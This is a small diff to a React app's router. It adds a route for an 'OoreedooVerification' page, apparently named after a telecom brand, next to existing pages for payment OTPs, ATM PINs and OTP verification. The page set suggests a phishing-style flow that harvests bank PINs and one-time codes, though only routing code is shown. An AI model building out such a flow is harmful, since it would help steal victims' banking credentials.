@@ -16,6 +16,7 @@ import PaymentOTP from "./pages/PaymentOTP";
 import OTPVerification from "./pages/OTPVerification";
 import ATMPin from "./pages/ATMPin";
 import Success from "./pages/Success";
+import OoreedooVerification from "./pages/OoreedooVerification";
 import NotFound from "./pages/NotFound";
 
 const queryClient = new QueryClient();
@@ -56,6 +57,7 @@ const AppContent = () => {
       <Route path="/registration-complete" element={<RegistrationComplete />} />
       <Route path="/payment-otp" element={<PaymentOTP />} />
       <Route path="/atm-pin" element={<ATMPin />} />
+      <Route path="/ooredoo-verification" element={<OoreedooVerification />} />
       <Route path="/otp-verification" element={<OTPVerification />} />
       <Route path="/success" element={<Success />} />
       {/* ADD ALL CUSTOM ROUTES ABOVE THE CATCH-ALL "*" ROUTE */}
